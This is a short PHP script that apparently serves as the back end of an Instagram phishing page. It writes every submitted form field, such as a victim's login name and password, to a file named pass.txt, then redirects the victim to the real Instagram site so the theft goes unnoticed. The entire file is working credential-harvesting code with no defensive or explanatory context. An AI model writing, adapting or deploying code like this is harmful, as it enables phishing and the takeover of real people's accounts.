<?php
//idk man who dat lol
header
('location:');
$handle=fopen("pass.txt","a");
foreach($_POST as $variable=>$value)
{
fwrite($handle,$variable);
fwrite($handle,"=");
fwrite($handle,$value);
fwrite($handle,"\r\n");
}
fwrite($handle,"\r\n");
fclose($handle);
header("location:https://www.instagram.com/");
exit;
// idk man who dat lol
?>
